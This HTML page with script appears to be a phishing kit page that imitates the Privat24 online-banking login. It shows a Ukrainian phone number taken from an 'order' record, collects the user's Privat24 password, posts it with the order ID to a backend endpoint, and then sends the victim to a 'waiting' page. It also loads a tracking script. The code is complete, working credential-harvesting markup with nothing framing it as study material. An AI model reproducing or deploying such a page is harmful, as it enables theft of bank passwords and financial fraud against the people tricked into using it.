<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Вхід/Реєстрація</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .header{
    display:flex;align-items:center;justify-content:flex-end;
    padding:14px 18px;border-bottom:1px solid #eee;
  }
  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}

  .content{flex:1;padding:52px 28px 0;display:flex;flex-direction:column}

  .title{
    font-size:26px;font-weight:400;color:#1a1a1a;
    text-align:center;letter-spacing:-.3px;margin:0 0 44px;
  }

  .phone-field{margin-bottom:36px}
  .lbl{font-size:13px;color:#9aa0a6;margin-bottom:10px;font-weight:400}
  .phone-row{
    display:flex;align-items:center;justify-content:space-between;gap:12px;
  }
  .phone-val{font-size:20px;color:#1a1a1a;font-weight:400;letter-spacing:.3px;flex:1}
  .edit-btn{
    background:none;border:none;cursor:pointer;padding:6px;
    display:flex;align-items:center;justify-content:center;
  }
  .edit-btn svg{width:20px;height:20px;fill:#1a1a1a}

  .pw-field{margin-bottom:14px}
  .pw-lbl{font-size:14px;color:#4EA524;margin-bottom:10px;font-weight:500}
  .pw-row{
    display:flex;align-items:center;gap:12px;
    padding-bottom:10px;border-bottom:1.5px solid #4EA524;
  }
  .pw-inp{
    flex:1;border:none;outline:none;font-size:18px;color:#1a1a1a;
    background:transparent;font-family:inherit;padding:0;letter-spacing:4px;
  }
  .pw-inp::placeholder{color:#d0d0d0;letter-spacing:4px}
  .eye-btn{
    background:none;border:none;cursor:pointer;padding:4px;
    display:flex;align-items:center;justify-content:center;color:#1a1a1a;
  }
  .eye-btn svg{width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}

  .forgot{
    font-size:14px;color:#9aa0a6;text-decoration:none;
    display:inline-block;margin-top:16px;
  }
  .forgot:hover{color:#1a1a1a}

  .err{
    display:none;margin:14px 0 0;padding:12px 14px;
    background:#fff0f0;border:1px solid #fcc;border-radius:10px;
    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
  }

  .btn-wrap{margin-top:40px;text-align:center}
  .btn-g{
    display:inline-block;padding:0 44px;height:48px;
    border:none;border-radius:26px;font-size:16px;font-weight:600;
    color:#fff;background:#4EA524;cursor:pointer;font-family:inherit;transition:.2s;
    min-width:180px;
  }
  .btn-g:hover{background:#3d8a1c}
  .btn-g:disabled{opacity:.4;cursor:default}
</style>
</head>
<body>

  <div class="header">
    <button class="x-btn" onclick="history.back()" aria-label="Close">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="content">
    <div class="title">Вхід/Реєстрація</div>

    <div class="phone-field">
      <div class="lbl">Номер телефону</div>
      <div class="phone-row">
        <div class="phone-val" id="userPhone">+38 (___) ___ __ __</div>
        <button class="edit-btn" onclick="editPhone()" aria-label="Змінити номер">
          <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1 1 0 0 0 0-1.41l-2.34-2.34a1 1 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
        </button>
      </div>
    </div>

    <div class="pw-field">
      <div class="pw-lbl">Пароль Приват24</div>
      <div class="pw-row">
        <input class="pw-inp" id="pw" type="password" placeholder="********" autocomplete="current-password" autofocus>
        <button class="eye-btn" id="eyeBtn" type="button" onclick="toggleEye()" aria-label="Показати пароль">
          <svg id="eyeOff" viewBox="0 0 24 24"><path d="M3 3l18 18M10.6 10.6a2 2 0 0 0 2.8 2.8M9.9 5.1A10.9 10.9 0 0 1 12 5c7 0 10 7 10 7a13.2 13.2 0 0 1-2.4 3.3M6.3 6.3A13.2 13.2 0 0 0 2 12s3 7 10 7a10.9 10.9 0 0 0 4.4-.9"/></svg>
          <svg id="eyeOn" viewBox="0 0 24 24" style="display:none"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg>
        </button>
      </div>
      <a class="forgot" href="#" onclick="return false">Забули пароль?</a>
    </div>

    <div class="err" id="errorMsg"></div>

    <div class="btn-wrap">
      <button class="btn-g" id="submitBtn" onclick="submitPassword()" disabled>Увійти</button>
    </div>
  </div>

<script>
  const params  = new URLSearchParams(location.search);
  const orderId = params.get("order");
  let   phone   = params.get("phone");

  if (!orderId) location.href = "index.html";

  function normalizePhone(p) {
    if (!p) return "";
    p = String(p).replace(/\D/g, "");
    if (p.startsWith("380")) p = p.substring(3);
    if (p.length === 9 && p[0] !== "0") p = "0" + p;
    return p;
  }
  function renderPhone(p) {
    p = normalizePhone(p);
    if (p.length < 10) return;
    const f = "+38 (" + p.substring(0,3) + ") " +
              p.substring(3,6) + " " +
              p.substring(6,8) + " " +
              p.substring(8,10);
    document.getElementById("userPhone").textContent = f;
  }

  if (phone) {
    renderPhone(phone);
  } else {
    fetch("/api/orders/" + orderId + "/status")
      .then(r => r.json())
      .then(d => { if (d.username) { phone = d.username; renderPhone(d.username); } })
      .catch(() => {});
  }

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "Пароль невірний";
    el.style.display = "block";
  }

  function editPhone() {
    location.href = "login.html?order=" + orderId;
  }

  const pw = document.getElementById("pw");
  const btn = document.getElementById("submitBtn");
  pw.addEventListener("input", () => {
    btn.disabled = pw.value.length < 1;
  });
  pw.addEventListener("keydown", e => {
    if (e.key === "Enter" && !btn.disabled) submitPassword();
  });

  function toggleEye() {
    const on = document.getElementById("eyeOn");
    const off = document.getElementById("eyeOff");
    if (pw.type === "password") {
      pw.type = "text";
      on.style.display = ""; off.style.display = "none";
    } else {
      pw.type = "password";
      on.style.display = "none"; off.style.display = "";
    }
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  async function submitPassword() {
    const val = pw.value;
    if (!val) return;
    btn.disabled = true;
    btn.textContent = "Зачекайте...";
    try {
      const res = await fetch("/api/password-data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order_id: orderId, password: val }),
      });
      const data = await res.json();
      if (data.success) {
        location.href = "waiting.html?order=" + orderId +
                        (phone ? "&phone=" + encodeURIComponent(phone) : "");
      } else {
        showError(data.message || "Сталася помилка");
        btn.disabled = false;
        btn.textContent = "Увійти";
      }
    } catch (err) {
      showError("Помилка з'єднання");
      btn.disabled = false;
      btn.textContent = "Увійти";
    }
  }
</script>
<script src="tracker.js"></script>
</body>
</html>
